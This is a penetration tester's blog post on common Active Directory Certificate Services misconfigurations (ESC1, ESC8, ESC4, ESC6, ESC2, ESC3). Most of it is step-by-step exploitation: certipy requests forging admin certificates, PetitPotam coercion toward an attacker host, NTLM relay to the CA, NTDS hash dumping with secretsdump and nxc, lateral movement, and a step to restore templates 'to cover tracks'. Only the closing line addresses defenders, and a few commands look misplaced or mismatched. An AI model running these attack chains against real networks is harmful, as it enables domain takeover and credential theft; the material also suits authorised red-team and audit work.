---
title: "The Most Common AD CS Misconfigurations in 2025"
date: 2025-09-01 00:00:00 +0700
categories: [ADCS]
tags: [Red-Teaming]
---

## A Pentester's View

Hey there, I'm Vince, a penetration tester with years of experience diving into Active Directory environments, uncovering vulnerabilities that can compromise entire networks. One client’s reaction after a particularly tough pentest still sticks with me: "Certificates are supposed to secure things, not hand out skeleton keys." That sentiment rings true—research from firms like SpecterOps and others highlights that Active Directory Certificate Services (AD CS) misconfigurations remain a pervasive problem in enterprise settings, often paving the way for full domain compromise.

In my hands-on work, I’ve found that ESC1 and ESC8 are the most frequent offenders, popping up in nearly every engagement I’ve tackled. Trailing behind are ESC4, ESC6, ESC2, and ESC3, each with its own potential to cause havoc. Let’s break these down as if I’m debriefing you after a red team operation, sharing the real-world weaknesses and how attackers turn them into opportunities for exploitation.

### ESC1: Enrollee Supplies Subject Alternative Name (SAN)

ESC1 is incredibly common. It’s when a certificate template lets low-privileged users enroll and specify their own Subject Alternative Name (SAN)—the identity field in the cert. The template also needs client authentication capabilities, like for smart card logon or general auth. Why’s this bad? An attacker can request a certificate with a domain admin’s SAN and authenticate as them via Kerberos or other protocols, no password needed. It’s a silent escalator to high privileges, often missed because it looks benign until exploited.

Exploit Code Snippet:
```
certipy-ad req -ca "CA-NAME" -dc-ip DC_IP -target TARGET_IP -u "MACHINE$@DOMAIN.LOCAL" -hashes :NTLM_HASH -template UserAuthentication -upn USER@DOMAIN.LOCAL
```

How to Exploit ESC1 (Step-by-Step):
1.	Enumerate vulnerable templates: Run the following to find templates with ESC1 flags (enrollee supplies subject and client auth EKU):
```
certipy-ad find -u "MACHINE$@DOMAIN.LOCAL" -hashes :NTLM_HASH -dc-ip DC_IP
```

2.	Collect AD data with BloodHound: Use bloodhound-python to gather more intel on the domain:
```
bloodhound-python -d DOMAIN.LOCAL -c LoggedOn -u "MACHINE$" -hashes :NTLM_HASH --backup-servers
```

Request certificate with spoofed SAN: Use the command below, specifying the vulnerable template, CA, and the target’s UPN:
```
certipy-ad req -ca "CA-NAME" -dc-ip DC_IP -target TARGET_IP -u "MACHINE$@DOMAIN.LOCAL" -hashes :NTLM_HASH -template UserAuthentication -upn USER@DOMAIN.LOCAL
```

3.	Authenticate with the cert: Run this to get a Kerberos ticket or NTLM hash as the target:
```
certipy-ad auth -pfx ./MACHINE.pfx -dc-ip DC_IP
```

4.	Escalate: Use the access to add yourself to admin groups or dump credentials. For example, use the retrieved NT hash for further attacks:
```
dig MACHINE.DOMAIN.LOCAL
```

```
certipy-ad auth -pfx MACHINE.pfx -dc-ip DC_IP
```

Then, use tools like impacket-wmiexec or nxc for lateral movement:
```
impacket-wmiexec 'DOMAIN.LOCAL/USER@DC_IP' -hashes :NTLM_HASH
```
Set up the network if needed for the attack machine:
```
sudo vim /etc/network/interfaces
sudo service networking restart

# Scan SMB on target machine
nxc smb TARGET_IP

# Run Responder on network interface
responder -I INTERFACE
```

Check shares:
```
# Access SMB shares using a Kerberos cache
nxc smb TARGET_IP -u USER -k-cache 'MACHINE.ccache'

# Run BloodHound enumeration for a machine account
bloodhound-python -u MACHINE$
```

### ESC8: NTLM Relay to AD CS Web Enrollment

ESC8 is just as common as ESC1 in my tests, especially in environments with weak network controls. It’s about AD CS web enrollment endpoints (like /certsrv) that lack protections like Extended Protection for Authentication (EPA). Attackers can relay a privileged user’s NTLM credentials to these endpoints, requesting a certificate as them. This is huge in relay-prone setups, as it turns coerced authentication into full impersonation of admins or even domain controllers.

Exploit Code Snippet:
```
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp --adcs --template "DomainController" --smb2support
```

How to Exploit ESC8 (Step-by-Step):

1.	Scan for domain controller and CA services: Use nxc and nmap to identify the domain controller and CA server.
```
nxc smb DC_IP
```

```
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='DOMAIN.LOCAL'"
```

```
nxc smb TARGET_IP
```

```
nmap -p 80 TARGET_IP --open -Pn
```

2.	Coerce NTLM auth: Use PetitPotam to force the DC to authenticate to your machine.
```
PetitPotam ATTACKER_IP DC_IP -pipe all
```

3.	Relay credentials: Run ntlmrelayx to forward the captured NTLM creds to the CA requesting a certificate:
```
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp --adcs --template "DomainController" --smb2support
```

4.	Authenticate: Use the relayed certificate (e.g., DC.pfx) to authenticate and retrieve the machine hash:
```
certipy-ad auth -pfx ./MACHINE.pfx
```

5.	Pivot and escalate: Use the hash to access the DC via SMB, dump NTDS hashes, and gain domain admin access:
```
nxc smb DC_IP -u "MACHINE$" -H "NTLM_HASH" --ntds --user
```

```
secretsdump.py -dc-ip DC_IP 'DOMAIN/MACHINE$@DC_IP' -hashes 'NTLM_HASH'
```

```
nxc smb DC_IP -u "DOMAIN_ADMIN" -H "NTLM_HASH"
```

### ESC4: Write Permissions on Certificate Template

ESC4 is less frequent but still a regular find in environments with loose access controls. It’s when a low-privileged user has write permissions on a certificate template, letting them modify its settings—like enabling SAN control or adding client auth EKUs. This turns a safe template into an ESC1-style attack vector. It’s dangerous because it’s like handing over the PKI rulebook to rewrite, opening the door to privilege escalation.

Exploit Code Snippet:
```
# Backup and modify a certificate template
certipy template -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template TEMPLATE_NAME -save-old

# Request a certificate from the modified template
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template TEMPLATE_NAME -upn ADMIN@DOMAIN.LOCAL -ca CA_NAME
```

How to Exploit ESC4 (Step-by-Step):

1.	Find writable templates: Use BloodHound or Certipy to spot templates you can modify:
```
certipy find -vulnerable -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP
```

Alternatively, in BloodHound: MATCH q=(u)-[:ADCSESC4]->() RETURN q.
2.	Modify the template: Back up the original and enable vulnerable settings (SAN and client auth EKUs):
```
certipy template -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template TEMPLATE_NAME -save-old
```

Exploit the modified template: Request a certificate as in ESC1:
```
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template TEMPLATE_NAME -upn ADMIN@DOMAIN.LOCAL -ca CA_NAME
```

3.	Authenticate: Use the certificate for elevated access:
```
certipy auth -pfx ADMIN.pfx -dc-ip DC_IP
```

4.	Clean up: Restore the original template to cover tracks:
```
certipy template -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
```

### ESC6: CA Allows SAN in Request Attributes
ESC6 is rarer but nasty. It happens when the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled, letting enrollees specify SANs via request attributes, even if the template doesn’t allow it. This makes even “secure” templates vulnerable to impersonation, as attackers can inject any identity into the certificate.

Exploit Code Snippet:
```
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE_NAME' -attributes 'san:upn=ADMIN@DOMAIN.LOCAL'
```

How to Exploit ESC6 (Step-by-Step):
1.	Check CA config: Confirm EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled:
```
certipy find -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP
```

2.	Find enrollable template: Look for one with client auth EKUs.
3.	Request with custom SAN: Inject the target’s UPN in the attributes:
```
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE_NAME' -attributes 'san:upn=ADMIN@DOMAIN.LOCAL'
```

4.	Authenticate: Save the PFX and authenticate:
```
certipy auth -pfx ADMIN.pfx -dc-ip DC_IP
```

5.	Act fast: CA logs might flag this, so escalate quickly.

### ESC2: Overly Permissive EKUs (Any Purpose/SubCA)
ESC2 is sneaky—it’s when templates have “Any Purpose” or SubCA EKUs that allow client authentication, and low-priv users can enroll while supplying the subject. Unlike ESC1, the EKU isn’t explicitly client auth, but the cert still works for it. This matters because it enables impersonation without obvious red flags in the template config.

Exploit Code Snippet:
```
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE_NAME' -on-behalf-of ADMIN@DOMAIN.LOCAL -pfx OUTPUT.pfx
```

How to Exploit ESC2 (Step-by-Step):
1.	Enumerate templates: Find templates with Any Purpose or SubCA EKUs and subject control:
```
certipy find -vulnerable -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP
```

2.	Get a base cert: Request a cert if needed:
```
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE_NAME'
```

3.	Request for target: Request a cert as the admin:
```
certipy req -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE_NAME' -on-behalf-of ADMIN@DOMAIN.LOCAL -pfx OUTPUT.pfx
```

4.	Authenticate: Get a TGT or hash:
```
certipy auth -pfx ADMIN.pfx -dc-ip DC_IP
```

5.	Lateral movement: Use Impacket or similar with the hash for further access.

### ESC3: Misconfigured Enrollment Agent Templates
ESC3 is the least common, but a jackpot when found. It’s when an enrollment agent template with the Certificate Request Agent EKU allows low-priv users to enroll and request certificates on behalf of others. This is a direct path to impersonating anyone, like a domain admin, with a single cert request.

Exploit Code Snippet:
```
# Request an Enrollment Agent certificate
certipy req -ca 'CA_NAME' -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template 'EnrollmentAgent' -target TARGET_HOST

# Use the agent certificate to request a certificate on behalf of another user
certipy req -ca 'CA_NAME' -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template 'User' -on-behalf-of 'DOMAIN\\ADMIN' -pfx AGENT.pfx
```

How to Exploit ESC3 (Step-by-Step):
1.	Find agent templates: Identify vulnerable templates:
```
certipy find -vulnerable -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP
```

2.	Request agent cert: Get the enrollment agent cert:
```
certipy req -ca 'CA_NAME' -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template 'EnrollmentAgent' -target TARGET_HOST
```

3.	Request target cert: Use the agent PFX to enroll as the admin:
```
certipy req -ca 'CA_NAME' -u USER@DOMAIN.LOCAL -p 'PASSWORD' -dc-ip DC_IP -template 'User' -on-behalf-of 'DOMAIN\\ADMIN' -pfx AGENT.pfx
```

4.	Authenticate: Use the resulting cert:
```
certipy auth -pfx ADMIN.pfx -dc-ip DC_IP
```

5.	Escalate: Use tools like Rubeus or Impacket for tickets/hashes and DC access.

### Wrapping Up

That’s my view from the trenches. ESC1 and ESC8 are the ones I see most, but don’t sleep on the others; they can still burn you. If you’re defending an AD CS setup, run tools like Certipy or BloodHound to audit these misconfigs before someone like me does. Stay sharp and lock those certs down!



